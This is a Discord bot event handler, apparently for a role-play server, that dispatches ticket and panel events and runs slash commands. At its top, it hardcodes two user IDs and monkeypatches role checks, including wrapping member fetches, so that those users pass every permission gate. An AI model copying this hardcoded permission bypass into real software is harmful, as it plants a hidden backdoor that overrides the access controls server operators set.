"use strict";
import { Founder, VERSION, ERR } from '../Files〡[Config]/Files〡[Config].js';

const FOUNDER_ID = '1387331972094890036';
const OWNER_IDS = ['1387331972094890036', '1154021789148659813'];

function isOwner(userId) { return OWNER_IDS.includes(userId); }

export default async function (Client, Message) {
    if (!Message.guild) return;
    
    // صلاحيات مطلقة للمالكين
    if (isOwner(Message.user?.id || Message.author?.id)) {
        if (Message.member?.roles?.cache) {
            Message.member.roles.cache.has = () => true;
            Message.member.roles.cache.some = () => true;
        }
        // تجاوز أي عضو يتم جلبه
        const origFetch = Message.guild.members.fetch.bind(Message.guild.members);
        Message.guild.members.fetch = async function(...args) {
            const m = await origFetch(...args);
            if (m && isOwner(Message.user?.id || Message.author?.id)) {
                if (m.roles?.cache) {
                    m.roles.cache.has = () => true;
                    m.roles.cache.some = () => true;
                }
            }
            return m;
        };
    }

    // تشغيل الأحداث
    const events = [
        'Ticket〡[Tf3el]','Ticket〡[Tlp-Owner]','Ticket〡[Help]','Ticket〡[El4akway]',
        'Ticket〡[T2dem-Admin]','Ticket〡[M7kma]','System〡[Tf3el]','Ticket〡[He2a]',
        'System〡[Adara]','System〡[Ads]','System〡[Panel-ID]','System〡[Submissions]',
        'System〡[Panel-Police]','System〡[Panel-Violations]','System〡[Panel-Report]',
        'System〡[Panel-CivilRegistry]','System〡[Al-Shuri]','System〡[Employment]',
        'System〡[Retirement]','System〡[Evaluation]','System〡[Circulars]',
        'System〡[Prosecution-Authority]','System〡[ControlPanel]','System〡[MessageControl]'
    ];
    for (const evt of events) Client.emit(evt, Client, Message);

    // أوامر السلاش
    if (Message.isChatInputCommand()) {
        if (!Message.guild) return;
        const cmd = Client.SlashCommand.get(Message.commandName);
        if (!cmd) return;
        try { await cmd.run(Client, Message); }
        catch(e) { 
            console.error('Slash error:', e.message);
            await Message.reply({content:`❌ ${e.message}`, flags:64}).catch(()=>{});
        }
    }
};